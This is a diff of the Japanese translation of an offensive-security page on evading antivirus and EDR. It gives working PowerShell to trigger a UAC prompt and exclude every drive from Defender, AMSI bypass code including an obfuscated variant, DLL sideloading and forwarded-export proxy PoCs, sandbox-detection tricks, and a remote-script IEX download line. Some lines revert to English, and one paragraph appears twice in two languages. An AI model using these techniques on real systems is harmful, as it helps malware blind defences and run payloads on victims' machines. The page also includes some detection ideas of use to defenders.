@@ -2,144 +2,173 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**によって書かれました！**
+**このページは** [**@m2rc_p**](https://twitter.com/m2rc_p)**が執筆しました!**
 
-## Stop Defender
+## Defender を停止
 
-- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender を動作しなくするツール。
-- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender を動作しなくするツール。
+- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender の動作を停止させるツール。
+- [no-defender](https://github.com/es3n1n/no-defender): 別の AV を偽装して Windows Defender の動作を停止させるツール。
 - [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)
 
-## **AV Evasion Methodology**
+### Defender を改変する前のインストーラー風 UAC ベイト
 
-現在、AV はファイルが悪意あるかどうかを判定するために、static detection、dynamic analysis、そしてより高度な EDR では behavioural analysis といった異なる手法を使用します。
+ゲームチートに扮した公開ロードは、未署名の Node.js/Nexe インストーラーとして配布されることが多く、まず**ユーザーに昇格を要求**し、その後で Defender を無効化します。フローは単純です:
+
+1. `net session` で管理者コンテキストを確認します。コマンドは呼び出し元が管理者権限を持っている場合にのみ成功するため、失敗した場合はロードが標準ユーザーとして実行されていることを示します。
+2. 元のコマンドラインを保持したまま、期待される UAC の同意プロンプトを発生させるために `RunAs` verb を使って即座に自身を再起動します。
+```powershell
+if (-not (net session 2>$null)) {
+powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
+exit
+}
+```
+被害者は既に「cracked」ソフトウェアをインストールしていると信じているため、プロンプトは通常承諾され、malwareがDefenderのポリシーを変更するために必要な権限が付与される。
+
+### すべてのドライブ文字に対する包括的な `MpPreference` 除外
+
+権限昇格後、GachiLoader-style chainsはサービスを完全に無効化する代わりにDefenderの盲点を最大化する。loaderはまずGUI watchdogを停止（`taskkill /F /IM SecHealthUI.exe`）し、その後**非常に広範な除外**を適用して、すべてのユーザープロファイル、システムディレクトリ、リムーバブルディスクをスキャン不能にする：
+```powershell
+$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
+Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
+$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
+Add-MpPreference -ExclusionExtension '.sys'
+```
+Key observations:
+
+- このループはすべてのマウントされたファイルシステム（D:\、E:\、USBスティック等）を走査するため、**ディスク上のどこにドロップされた将来のペイロードも無視される**。
+- `.sys` 拡張子の除外は将来を見越したもので、攻撃者は Defender に再度触れることなく後で署名されていないドライバをロードする選択肢を残す。
+- すべての変更は `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` に保存されるため、後続の段階で UAC を再発生させることなく除外が持続しているか確認したり、拡張したりできる。
+
+Defender のサービスは停止されないため、単純なヘルスチェックは「antivirus active」と報告し続けるが、リアルタイム検査はこれらのパスに一切触れない。
+
+## **AV 回避の方法論**
+
+現在、AV はファイルが悪意あるかどうかを確認するために、static detection（静的検出）、dynamic analysis（動的分析）、そしてより高度な EDR では behavioural analysis（振る舞い分析）といった異なる手法を用いる。
 
 ### **Static detection**
 
-Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト配列にフラグを立てること、さらにファイル自体から情報を抽出すること（例: file description, company name, digital signatures, icon, checksum など）によって行われます。つまり、既知の公開ツールを使うと既に分析され悪意ありとマークされている可能性が高く、検出されやすくなります。こうした検出を回避する方法はいくつかあります:
+Static detection は、バイナリやスクリプト内の既知の悪意ある文字列やバイト配列にフラグを立てること、そしてファイル自体から情報を抽出すること（例：file description、company name、digital signatures、icon、checksum 等）によって実現される。これは、既知のパブリックツールを使うと検出されやすくなることを意味する。これらの検出を回避する方法はいくつかある：
 
 - **Encryption**
 
-  バイナリを暗号化すれば、AV がプログラムを検出する方法はなくなりますが、メモリ上で復号して実行するための何らかの loader が必要になります。
+  バイナリを暗号化すれば AV がプログラムを検出する方法はなくなるが、メモリ上で復号して実行するためのローダーが必要になる。
 
 - **Obfuscation**
 
-  時にはバイナリやスクリプト内のいくつかの文字列を変更するだけで AV を回避できますが、何を難読化するかによっては手間のかかる作業になることがあります。
+  バイナリやスクリプト内の文字列をいくつか変更するだけで AV を通過できる場合もあるが、何を難読化するかによっては手間がかかる。
 
 - **Custom tooling**
 
-  独自ツールを開発すれば既知の悪性シグネチャは存在しませんが、多くの時間と労力がかかります。
+  独自ツールを開発すれば既知の悪性シグネチャは存在しないが、多大な時間と労力がかかる。
 
 > [!TIP]
-> Windows Defender の static detection に対してチェックする良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) です。基本的にファイルを複数のセグメントに分割して Defender に個別にスキャンさせることで、バイナリ内でどの文字列やバイトがフラグ化されているかを正確に教えてくれます。
+> Windows Defender の静的検出に対して確認する良い方法は [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) だ。ファイルを複数のセグメントに分割し、各セグメントを個別に Defender にスキャンさせることで、バイナリ内でどの文字列やバイトがフラグされているかを正確に教えてくれる。
 
-この実践的な AV Evasion に関する [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) はぜひチェックしてください。
+実用的な AV 回避に関するこの [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) はぜひチェックすることを強く勧める。
 
 ### **Dynamic analysis**
 
-Dynamic analysis は、AV がサンドボックス内でバイナリを実行して悪意ある活動（例: ブラウザのパスワードを復号して読み取ろうとする、LSASS に対する minidump を実行するなど）を監視する手法です。この部分はやや扱いが難しいですが、サンドボックスを回避するためにできることはいくつかあります。
+Dynamic analysis は AV がバイナリをサンドボックス内で実行し、悪意のある活動（例：ブラウザのパスワードを復号して読む試行、LSASS のミニダンプ実行など）を監視することを指す。この部分はやや厄介だが、サンドボックスを回避するためにできることがいくつかある。
 
-- **Sleep before execution** 実装次第では、AV の dynamic analysis をバイパスする有効な方法になり得ます。AV はユーザーのワークフローを妨げないようにファイルスキャンに非常に短い時間しか使えないため、長い sleep を使うことでバイナリの分析を妨げることができます。ただし、多くの AV のサンドボックスは実装に応じて sleep をスキップしてしまうことがあります。
-- **Checking machine's resources** 通常、サンドボックスは利用可能なリソースが非常に少ない（例: < 2GB RAM）ため、リソースをチェックすることで判別できます。さらに創造的に、CPU 温度やファン速度をチェックするなど、すべてがサンドボックスに実装されているわけではありません。
-- **Machine-specific checks** 特定のユーザーのワークステーションが "contoso.local" ドメインに参加していることをターゲットにしたい場合、コンピュータのドメインをチェックして指定したものと一致するかを確認し、一致しなければプログラムを終了させることができます。
+- **Sleep before execution** 実装次第では、実行前に長時間スリープすることは AV の動的分析を回避する優れた手段になり得る。AV はユーザーのワークフローを妨げないためにスキャン時間が非常に短いため、長いスリープは解析を妨げることがある。ただし、多くの AV のサンドボックスは実装によってスリープをスキップできる点が問題だ。
+- **Checking machine's resources** 通常、サンドボックスは扱えるリソースが非常に限られている（例：< 2GB RAM）。さもなければユーザーのマシンを遅くしてしまうためだ。CPU の温度やファン速度を確認するなど、ここでは非常に創造的になれる。サンドボックスで実装されていないことも多い。
+- **Machine-specific checks** 例えば、対象ユーザーのワークステーションが "contoso.local" ドメインに参加している場合、コンピュータのドメインをチェックして指定したものと一致するか確認し、一致しなければプログラムを終了させることができる。
 
-Microsoft Defender のサンドボックスの computername は HAL9TH であることが判明しています。したがって、マルウェア実行前にコンピュータ名をチェックし、名前が HAL9TH と一致する場合は Defender のサンドボックス内にいると判断してプログラムを終了させることができます。
+Microsoft Defender のサンドボックスのコンピュータ名は HAL9TH であることが判明している。つまり、デトネーション前にマルウェア内でコンピュータ名をチェックし、名前が HAL9TH と一致すれば Defender のサンドボックス内にいることが分かるので、プログラムを終了させることができる。
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-Sandboxes に対抗するための [@mgeeky](https://twitter.com/mariuszbit) からのその他の非常に良いヒント
+サンドボックス対策に関する @mgeeky のその他の有用なヒント
 
-<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev チャンネル</p></figcaption></figure>
+<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://twitter.com/mariuszbit">@mgeeky</a> と <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> の #malware-dev チャンネル</p></figcaption></figure>
 
-前述のように、**public tools** はいずれ**検出されます**。そこで自分に問うべきことがあります:
+前述のとおり、この投稿では **public tools** はいずれ **検出される**。そこで自問すべきことがある：
 
-例えば、LSASS をダンプしたい場合、**本当に mimikatz を使う必要があるのか**？それとも、あまり知られていない別のプロジェクトで LSASS をダンプできるものを使えるのか。
+例えば、LSASS をダンプしたい場合、**本当に mimikatz を使う必要があるのか**？あるいは LSASS をダンプする別の知名度の低いプロジェクトを使えないか？
 
-正しい答えはおそらく後者です。mimikatz を例に取ると、そのプロジェクト自体は非常に優れていますが、AV や EDR によって最も多くフラグ付けされるツールの一つであり、AV を回避するために扱うのは悪夢のような作業になります。したがって、達成したいことに対して代替手段を探してください。
+正解はおそらく後者だ。mimikatz を例に取れば、プロジェクト自体は非常に優れているが、AV や EDR によって最もフラグされるソフトの一つであり、AV を回避するために扱うのは悪夢のような作業になる。したがって、達成したいことに対して代替手段を探すべきだ。
 
 > [!TIP]
-> ペイロードを回避のために修正する際は、Defender の **turn off automatic sample submission** を必ず行ってください。そして真剣に、長期的な回避を目標とするなら **DO NOT UPLOAD TO VIRUSTOTAL**（VirusTotal にアップロードしない）ことを守ってください。特定の AV によってペイロードが検出されるか確認したい場合は、VM にその AV をインストールし、automatic sample submission をオフにして、満足するまでそこでテストしてください。
+> ペイロードを回避用に変更する際は、Defender の **自動サンプル送信をオフにする**ことを必ず行い、長期的に回避を目指すのであれば、お願いだから **DO NOT UPLOAD TO VIRUSTOTAL**。特定の AV による検出を確認したい場合は、VM にその AV をインストールして自動サンプル送信をオフにし、満足するまでそこでテストすること。
 
 ## EXEs vs DLLs
 
-可能な限り、常に **prioritize using DLLs for evasion** を心がけてください。私の経験では、DLL ファイルは通常 **way less detected** で解析されにくいため、（ペイロードが DLL として実行可能であれば）検出を回避するための非常にシンプルなトリックになります。
+可能な限り、回避には常に **DLL を使うことを優先する**べきだ。私の経験では、DLL ファイルは通常 **検出されにくく**、解析もされにくいため、（ペイロードが DLL として実行可能であれば）検出を回避するための非常に単純なトリックになる。
 
-この画像からわかるように、Havoc の DLL ペイロードは antiscan.me で検出率が 4/26 であるのに対し、EXE ペイロードは 7/26 の検出率でした。
+この画像から分かるように、Havoc の DLL ペイロードは antiscan.me で検出率が 4/26、EXE ペイロードは 7/26 だ。
 
-<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>
+<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me による通常の Havoc EXE ペイロードと通常の Havoc DLL の比較</p></figcaption></figure>
 
-ここからは、DLL ファイルを使ってよりステルスにするためのいくつかのトリックを紹介します。
+次に、DLL ファイルを使ってよりステルス性を高めるためのいくつかのトリックを示す。
 
 ## DLL Sideloading & Proxying
 
-**DLL Sideloading** はローダーが使用する DLL 搜索順序を利用し、被害者アプリケーションと悪意あるペイロードを同じディレクトリに配置することで成立します。
+**DLL Sideloading** はローダーの DLL 検索順を利用し、被害アプリケーションと悪意あるペイロードを並べて配置することで成立する。
 
-DLL Sideloading に脆弱なプログラムは [Siofra](https://github.com/Cybereason/siofra) と以下の powershell スクリプトを使って確認できます:
+Siofra と以下の powershell スクリプトを使って、DLL Sideloading に脆弱なプログラムをチェックできる：
 ```bash
 Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
 $binarytoCheck = "C:\Program Files\" + $_
 C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
 }
 ```
-このコマンドは "C:\Program Files\\" 内で DLL hijacking に脆弱なプログラムの一覧と、それらが読み込もうとする DLL ファイルを出力します。
+このコマンドは "C:\Program Files\\" 内の DLL hijacking の影響を受けやすいプログラムと、それらがロードしようとする DLL ファイルの一覧を出力します。
 
-私は **explore DLL Hijackable/Sideloadable programs yourself** を強くおすすめします。この技術は適切に行えば非常にステルス性が高いですが、既知の DLL Sideloadable プログラムを使うと簡単に見つかる可能性があります。
+私は、**DLL Hijackable/Sideloadable programs を自分で探索することを強くおすすめします**。この手法は正しく行えばかなりステルスですが、公に知られた DLL Sideloadable プログラムを使うと簡単に検知される可能性があります。
 
-プログラムが期待する名前の悪意ある DLL を置いただけでは、payload は読み込まれません。プログラムはその DLL 内に特定の関数を期待しているためです。この問題を解決するために、別のテクニックである **DLL Proxying/Forwarding** を使用します。
+単にプログラムがロードを期待する名前の悪意ある DLL を配置するだけでは、プログラムがその DLL 内に特定の関数を期待しているため、必ずしも payload を実行できません。この問題を解決するために、**DLL Proxying/Forwarding** という別の手法を使います。
 
-**DLL Proxying** は、プロキシ（および悪意ある）DLL から元の DLL へプログラムが行う呼び出しを転送することで、プログラムの機能を維持しつつあなたの payload の実行を扱えるようにします。
+**DLL Proxying** は、プログラムがプロキシ（悪意ある）DLL に行う呼び出しを元の DLL に転送することで、プログラムの機能を維持しつつ payload の実行を扱えるようにします。
 
-私は [@flangvik](https://twitter.com/Flangvik/) の [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクトを使用します。
+今回は [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) プロジェクト（作者: [@flangvik](https://twitter.com/Flangvik/)）を使用します。
 
-以下が私が行った手順です：
+以下が私が行った手順です:
 ```
 1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
 2. Generate some shellcode (I used Havoc C2)
 3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
 4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
 ```
-最後のコマンドは、次の2つのファイルを生成します: DLL のソースコードテンプレートと、リネームされた元の DLL。
+最後のコマンドは次の2つのファイルを生成します: DLL のソースコードテンプレートと、リネームされた元の DLL。
 
 <figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
 ```
 5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
 ```
-These are the results:
-
 <figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>
 
-Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.
+当方の shellcode（[SGN](https://github.com/EgeBalci/sgn) でエンコード）と proxy DLL は [antiscan.me](https://antiscan.me) で 0/26 の検出率でした！ 成功と言えるでしょう。
 
 <figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> **強くおすすめします**： [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543)（DLL Sideloading に関する）と、[ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) を視聴すると、ここで議論した内容をより深く学べます。
+> 私は DLL Sideloading に関する [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) を**強くおすすめします**。また、我々が議論した内容をより深く学ぶために [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) も観てください。
 
-### Abusing Forwarded Exports (ForwardSideLoading)
+### Forwarded Exports の悪用 (ForwardSideLoading)
 
-Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:
+Windows の PE モジュールは、実際には「forwarders」と呼ばれる関数をエクスポートできます。コードを指す代わりに、エクスポートエントリは `TargetDll.TargetFunc` の形式の ASCII 文字列を含みます。呼び出し元がエクスポートを解決すると、Windows ローダーは次のことを行います:
 
-- `TargetDll` がまだロードされていなければロードする
+- `TargetDll` がまだロードされていない場合はロードする
 - そこから `TargetFunc` を解決する
 
-Key behaviors to understand:
-- `TargetDll` が KnownDLL の場合、保護された KnownDLLs namespace（例: ntdll, kernelbase, ole32）から供給される。
-- `TargetDll` が KnownDLL でない場合、通常の DLL 検索順序が使われ、その中には forward 解決を行っているモジュールのディレクトリが含まれる。
+理解しておくべき主な挙動:
+- `TargetDll` が KnownDLL の場合、保護された KnownDLLs 名前空間（例: ntdll, kernelbase, ole32）から提供される。
+- `TargetDll` が KnownDLL でない場合は通常の DLL 検索順が使用され、forward を解決しているモジュールのディレクトリも含まれる。
 
-This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.
+これにより間接的な sideloading プリミティブが可能になります: 署名済み DLL の中から、エクスポートが non-KnownDLL モジュール名に forward されている関数を見つけ、その署名済み DLL を forward 先モジュールと同名の、攻撃者が制御する DLL と同じディレクトリに置きます。フォワードされたエクスポートが呼び出されると、ローダーはフォワードを解決して同じディレクトリからあなたの DLL をロードし、DllMain を実行します。
 
-Example observed on Windows 11:
+Windows 11 で観測された例:
 ```
 keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
 ```
-`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順序で解決される。
+`NCRYPTPROV.dll` は KnownDLL ではないため、通常の検索順で解決されます。
 
-PoC (コピー＆ペースト):
-1) 署名済みのシステム DLL を書き込み可能なフォルダにコピーする
+PoC (コピペ):
+1) 署名済みのシステムDLLを書き込み可能なフォルダにコピーする
 ```
 copy C:\Windows\System32\keyiso.dll C:\test\
 ```
-同じフォルダに悪意のある `NCRYPTPROV.dll` を配置します。最小限の `DllMain` があればコード実行を得るのに十分です。`DllMain` をトリガーするためにフォワードされた関数を実装する必要はありません。
+同じフォルダに悪意のある `NCRYPTPROV.dll` を置く。最小限の DllMain でコード実行が可能で、DllMain をトリガーするためにフォワードされた関数を実装する必要はない。
 ```c
 // x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
 #include <windows.h>
@@ -151,35 +180,35 @@ if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&
 return TRUE;
 }
 ```
-3) サイン済みの LOLBin を使用してフォワードをトリガーする:
+3) サイン済みの LOLBin でフォワードをトリガーする:
 ```
 rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
 ```
-観測された挙動:
-- `rundll32` (署名済み) がサイドバイサイドの `keyiso.dll` (署名済み) を読み込む
+Observed behavior:
+- rundll32（署名済み）はサイドバイサイドの `keyiso.dll`（署名済み）をロードする
 - `KeyIsoSetAuditingInterface` を解決する際、ローダーはフォワード先の `NCRYPTPROV.SetAuditingInterface` をたどる
-- その後ローダーは `C:\test` から `NCRYPTPROV.dll` を読み込み、その `DllMain` を実行する
-- `SetAuditingInterface` が実装されていない場合、`DllMain` が既に実行された後でのみ "missing API" エラーが発生する
+- その後ローダーは `C:\test` から `NCRYPTPROV.dll` をロードし、その `DllMain` を実行する
+- もし `SetAuditingInterface` が実装されていない場合、`DllMain` 実行後にようやく "missing API" エラーが発生するだけになる
 
-ハンティングのヒント:
-- ターゲットモジュールが KnownDLL ではないようなフォワードされたエクスポートに注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
-- フォワードされたエクスポートは次のようなツールで列挙できる:
+Hunting tips:
+- ターゲットモジュールが KnownDLL でないフォワードされたエクスポートに注目する。KnownDLLs は `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` に列挙されている。
+- 次のようなツールでフォワードされたエクスポートを列挙できる:
 ```
 dumpbin /exports C:\Windows\System32\keyiso.dll
 # forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
 ```
-- Windows 11 の forwarder inventory を参照して候補を探してください: https://hexacorn.com/d/apis_fwd.txt
+- 候補を探すには、Windows 11 forwarder インベントリを参照してください: https://hexacorn.com/d/apis_fwd.txt
 
-検知・防御のアイデア:
-- LOLBins (例: rundll32.exe) が非システムパスから署名済み DLL を読み込み、そのディレクトリから同じベース名の non-KnownDLLs を読み込む動作を監視する
-- ユーザー書き込み可能なパス下で、次のようなプロセス/モジュールチェーンを検出してアラートする: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll`
-- コード整合性ポリシー (WDAC/AppLocker) を適用し、アプリケーションディレクトリで write+execute を禁止する
+検知/防御のアイデア:
+- Monitor LOLBins（例: rundll32.exe）が非システムパスから署名済み DLL を読み込み、そのディレクトリから同じベース名の non-KnownDLLs を読み込む挙動を監視する
+- ユーザー書き込み可能なパス下で、`rundll32.exe` → 非システムの `keyiso.dll` → `NCRYPTPROV.dll` のようなプロセス/モジュールチェーンをアラートする
+- コード整合性ポリシー (WDAC/AppLocker) を適用し、アプリケーションディレクトリでの書き込み＋実行を拒否する
 
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
 `Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
 
-Freeze を使うと、shellcode を目立たない方法でロードして実行できます。
+Freeze を使用して shellcode をステルスにロードおよび実行できます。
 ```
 Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
 1. Generate some shellcode, in this case I used Havoc C2.
@@ -189,13 +218,13 @@ Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freez
 <figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>
 
 > [!TIP]
-> 回避は常にネコとネズミのゲームです。今日有効でも明日検出される可能性があるため、単一のツールだけに頼らないでください。可能なら複数の回避手法を組み合わせてください。
+> Evasionはいたちごっこに過ぎません。今日有効な手法が明日検出される可能性があるため、単一のツールに頼らないでください。可能であれば複数の回避技術を組み合わせてください。
 
 ## AMSI (Anti-Malware Scan Interface)
 
-AMSIは"[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"を防ぐために作られました。当初、AVはディスク上のファイルのみをスキャンできたため、ペイロードをメモリ上で直接実行できれば、AVは防ぐ手段がほとんどありませんでした（可視性が足りなかったため）。
+AMSIは「[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)」を防ぐために作られました。当初、AVは**files on disk**のみをスキャンできたため、もしペイロードを**directly in-memory**で実行できれば、AVは十分な可視性がなく防ぐことができませんでした。
 
-AMSI機能はWindowsの次のコンポーネントに統合されています。
+The AMSI feature is integrated into these components of Windows.
 
 - User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
 - PowerShell (scripts, interactive use, and dynamic code evaluation)
@@ -203,39 +232,41 @@ AMSI機能はWindowsの次のコンポーネントに統合されています。
 - JavaScript and VBScript
 - Office VBA macros
 
-AMSIはスクリプトの内容を非暗号化・非難読化された形式で公開することで、アンチウイルスがスクリプトの振る舞いを検査できるようにします。
+スクリプトの内容を暗号化・難読化されていない形で公開することで、ウイルス対策ソリューションがスクリプトの挙動を検査できるようにします。
 
-`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` を実行すると、Windows Defenderで次のアラートが表示されます。
+Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.
 
 <figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>
 
-スクリプトが実行された実行ファイルへのパス（この場合は powershell.exe）の前に `amsi:` が付与されているのがわかります。
+amsi: を先頭に付け、その後にスクリプトが実行された実行ファイルのパス（この場合は powershell.exe）を付加していることに注目してください。
 
-ファイルをディスクに落としていなくても、AMSIのためにメモリ上で検出されてしまいました。
+ファイルをディスクに配置していなくても、AMSIのためにin-memoryで検出されてしまいました。
 
-さらに、**.NET 4.8** 以降では、C#コードもAMSIを通して実行されます。これは `Assembly.Load(byte[])` を使ったメモリ内実行にも影響します。したがって、AMSIを回避してメモリ実行を行いたい場合は、4.7.2以下などの古いバージョンの .NET を使うことが推奨されます。
+Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.
 
-AMSIを回避する方法はいくつかあります。
+さらに、**.NET 4.8**以降、C#コードもAMSIを通して実行されます。これは `Assembly.Load(byte[])` によるin-memory実行にも影響します。したがって、AMSIを回避してin-memory実行を行いたい場合は、4.7.2などのより低いバージョンの .NET を使用することが推奨されます。
+
+There are a couple of ways to get around AMSI:
 
 - **Obfuscation**
 
-AMSIは主に静的検知で動作するため、読み込もうとするスクリプトを変更することは検出回避に有効な場合があります。
+AMSIは主に静的検出で動作するため、ロードするスクリプトを変更することは検出回避の有効な方法になり得ます。
 
-ただし、AMSIは複数層の難読化でも可能な限り復号してしまう能力があるため、難読化のやり方によっては有効でないことがあります。そのため回避は必ずしも単純ではありません。とはいえ、変数名を数箇所変えるだけで十分なこともあるため、どれだけフラグが付いているか次第です。
+ただし、多層のobfuscationであってもAMSIはスクリプトを脱難読化できる可能性があるため、obfuscationのやり方によっては有効でないことがあります。そのため回避は単純ではありません。とはいえ、変数名をいくつか変更するだけで十分な場合もあるので、どれだけ検出されているかによります。
 
 - **AMSI Bypass**
 
-AMSIはDLLをpowershell（および cscript.exe, wscript.exe など）プロセスにロードすることで実装されているため、特権のないユーザでも簡単に改変することが可能です。この実装上の欠陥により、研究者たちはAMSIスキャンを回避する複数の手法を見つけています。
+AMSIはDLLをpowershell（および cscript.exe、wscript.exe など）のプロセスにロードすることで実装されているため、権限のないユーザーとして実行していても簡単に改変することが可能です。このAMSI実装の欠陥により、研究者たちは複数のAMSI回避手法を見つけています。
 
 **Forcing an Error**
 
-AMSIの初期化を失敗させる（amsiInitFailed）と、そのプロセスに対してスキャンが開始されなくなります。これは元々 [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftはこれを広く使われるのを防ぐためにシグネチャを作成しました。
+AMSIの初期化を失敗させる（amsiInitFailed）と、当該プロセスではスキャンが開始されなくなります。これはもともと [Matt Graeber](https://twitter.com/mattifestation) によって公開され、Microsoftはその広範な利用を防ぐためのシグネチャを開発しました。
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-たった1行の powershell コードで、現在の powershell プロセスに対して AMSI を使用不能にできた。この1行は当然 AMSI によって検出されるため、この手法を使うには修正が必要だ。
+現在の powershell プロセスで AMSI を無効化するには、powershell の一行のコードで十分だった。この一行はもちろん AMSI 自体によって検知されるため、この手法を利用するには多少の修正が必要になる。
 
-以下は私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取得した修正済みの AMSI bypass。
+以下は、私がこの [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) から取ってきた修正済みの AMSI bypass です。
 ```bash
 Try{#Ams1 bypass technic nº 2
 $Xdatabase = 'Utils';$Homedrive = 'si'
@@ -249,22 +280,22 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-念のため、この記事が公開されるとおそらく検知される可能性があるため、検出を避けたいのであればコードを公開しないでください。
+Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
 
 **Memory Patching**
 
-この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見されました。手法の内容は、ユーザーから提供された入力をスキャンする役割を持つ `AmsiScanBuffer` 関数の `amsi.dll` 内のアドレスを特定し、`E_INVALIDARG` を返す命令で上書きするというものです。こうすることで実際のスキャン結果は `0` を返し、クリーンと解釈されます。
+この手法は最初に [@RastaMouse](https://twitter.com/_RastaMouse/) によって発見され、amsi.dll 内の "AmsiScanBuffer" 関数（ユーザー提供の入力をスキャンする役割がある）のアドレスを特定し、E_INVALIDARG を返す命令で上書きします。こうすることで、実際のスキャンの結果は 0 を返し、それがクリーンな結果として解釈されます。
 
 > [!TIP]
-> 詳細な説明については [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) を参照してください。
+> 詳細な説明は [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) をお読みください。
 
-AMSI を powershell で bypass するための他の多くの手法も存在します。詳しくは [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) と [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) を参照してください。
+There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.
 
-### AMSI をブロックするために amsi.dll のロードを防ぐ (LdrLoadDll hook)
